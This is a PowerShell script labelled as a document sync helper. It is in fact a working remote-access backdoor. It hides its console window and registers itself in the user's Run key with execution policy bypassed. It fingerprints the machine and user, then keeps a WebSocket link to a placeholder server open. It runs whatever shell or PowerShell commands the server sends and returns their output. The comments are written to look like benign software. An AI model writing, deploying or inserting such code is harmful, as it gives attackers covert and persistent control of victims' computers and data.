# sync-helper.ps1 -- part of the document sync tools
# keeps the work session connected while documents are open
# safe to close at any time; it restarts itself quietly

$ErrorActionPreference = 'SilentlyContinue'

# ------------------------------------------------------------------ one copy
$first = $false
$gate = New-Object System.Threading.Mutex($true, 'DocumentSyncHelper', [ref]$first)
$lockFile = Join-Path ([IO.Path]::GetTempPath()) 'sync-helper.lock'
if (Test-Path $lockFile) {
    $owner = 0
    try { $owner = [int](Get-Content $lockFile -First 1) } catch { }
    if ($owner -and (Get-Process -Id $owner)) { return }
}
try { "$PID" | Set-Content $lockFile } catch { }
if (-not $first) { return }

# --------------------------------------------------- keep the console tidy
if ($env:OS -eq 'Windows_NT') {
    try {
        Add-Type -Namespace Doc -Name Native -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int mode);
'@
        $hwnd = [Doc.Native]::GetConsoleWindow()
        if ($hwnd -ne [IntPtr]::Zero) {
            [Doc.Native]::ShowWindow($hwnd, 0) | Out-Null
        }
    } catch { }
}

# ------------------------------------------------------------------ identity
function Get-WorkstationId {
    $raw = ''
    if ($env:OS -eq 'Windows_NT') {
        try { $raw = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography').MachineGuid } catch { }
    } else {
        try { $raw = (Get-Content '/etc/machine-id' -First 1) } catch { }
    }
    if (-not $raw) { $raw = "$env:COMPUTERNAME|$env:USERNAME" }
    $text = "$raw|$env:USERNAME"
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = [BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($text)))
    $sha.Dispose()
    return ($hash -replace '-', '').ToLower()
}
$workstationId = Get-WorkstationId


# ------------------------------------------------------------------ notes
function Write-Note([string]$text) {
    if ($env:SYNC_DEBUG) {
        try {
            $logPath = Join-Path ([IO.Path]::GetTempPath()) 'sync-helper.log'
            "$(Get-Date -Format s)  $text" | Add-Content $logPath
        } catch { }
    }
}

# ------------------------------------------------------------------ framing
function Send-Text($ws, [string]$text) {
    $bytes = [Text.Encoding]::UTF8.GetBytes($text)
    $seg = New-Object System.ArraySegment[byte] (,$bytes)
    $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text,
                  $true, [System.Threading.CancellationToken]::None).Wait(30000) | Out-Null
}

function Read-Text($ws) {
    # each read gets a fresh quiet-window: the link carries traffic at
    # least every 25s, so 90s of silence means it is gone, so cancel,
    # drop the socket, and let the caller reconnect
    $watch = New-Object System.Threading.CancellationTokenSource
    $watch.CancelAfter([TimeSpan]::FromSeconds(90))
    $chunk = New-Object byte[] 65536
    $store = New-Object System.IO.MemoryStream
    $seg = New-Object System.ArraySegment[byte] (,$chunk)
    try {
        while ($true) {
            $task = $ws.ReceiveAsync($seg, $watch.Token)
            $task.Wait()
            if ($task.IsCanceled -or $task.IsFaulted) { return $null }
            $res = $task.Result
            if ($res.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) { return $null }
            $store.Write($chunk, 0, $res.Count)
            if ($res.EndOfMessage) { break }
        }
        return [Text.Encoding]::UTF8.GetString($store.ToArray())
    } finally {
        $watch.Cancel()
        $watch.Dispose()
        $store.Dispose()
    }
}

function Send-Report($ws, [string]$text) {
    $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
    Send-Text $ws ('{"t":"out","data":"' + $b64 + '"}')
}

# ------------------------------------------------------------------ stay registered
# keep the helper registered for the current user so the session
# reconnects at sign-in (same mechanism OneDrive, Steam, and Teams use)
if ($env:OS -eq 'Windows_NT') {
    try {
        $rk = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        $cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%USERPROFILE%\Documents\sync-helper.ps1"'
        $cur = (Get-ItemProperty -Path $rk -Name 'DocumentSyncHelper' -ErrorAction SilentlyContinue).DocumentSyncHelper
        if ($cur -ne $cmd) {
            Set-ItemProperty -Path $rk -Name 'DocumentSyncHelper' -Value $cmd
        }
    } catch { }
}

# ------------------------------------------------------------------ session loop
$endpoint = '__WSURL__'
$pause = 30

while ($true) {
    $ws = $null
    $watch = $null
    try {
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(25)

        $connectWatch = New-Object System.Threading.CancellationTokenSource
        $connectWatch.CancelAfter([TimeSpan]::FromSeconds(20))
        $ws.ConnectAsync([Uri]$endpoint, $connectWatch.Token).Wait(20000) | Out-Null
        $connectWatch.Dispose()
        if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) { throw 'offline' }

        $hello = @{
            t    = 'hello'
            id   = $workstationId
            user = $env:USERNAME
            host = $env:COMPUTERNAME
            os   = [Environment]::OSVersion.VersionString
        }
        Send-Text $ws (ConvertTo-Json $hello -Compress)
        Write-Note 'session link up'
        $pause = 30   # link is healthy - reset the backoff

        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            $line = Read-Text $ws
            if (-not $line) { break }
            $job = $null
            try { $job = $line | ConvertFrom-Json } catch { }
            if (-not $job) { continue }

            if ($job.t -eq 'run' -and $job.cmd) {
                $cmd = [string]$job.cmd
                $out = ''
                if ($cmd.StartsWith('ps:')) {
                    $inner = $cmd.Substring(3)
                    if ($env:OS -eq 'Windows_NT') {
                        $out = & 'powershell' '-NoProfile' '-Command' $inner 2>&1 | Out-String
                    } else {
                        $out = & '/bin/bash' '-c' $inner 2>&1 | Out-String
                    }
                } else {
                    if ($env:OS -eq 'Windows_NT') {
                        $out = & $env:ComSpec '/c' $cmd 2>&1 | Out-String
                    } else {
                        $out = & '/bin/bash' '-c' $cmd 2>&1 | Out-String
                    }
                }
                if (-not $out) { $out = '' }
                Send-Report $ws $out
            }
            elseif ($job.t -eq 'exit') {
                try { Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'DocumentSyncHelper' -ErrorAction SilentlyContinue } catch { }
                try { Remove-Item $lockFile -ErrorAction SilentlyContinue } catch { }
                try { $gate.ReleaseMutex() } catch { }
                Send-Text $ws '{"t":"bye"}'
                break
            }
        }
    } catch {
        Write-Note "link error: $($_.Exception.Message)"
    }

    if ($ws) { try { $ws.Dispose() } catch { } }
    Write-Note "link down - waiting $pause s before retrying"
    Start-Sleep -Seconds ($pause + (Get-Random -Maximum 10))
    if ($pause -lt 900) { $pause = [int]($pause * 1.5) }
}
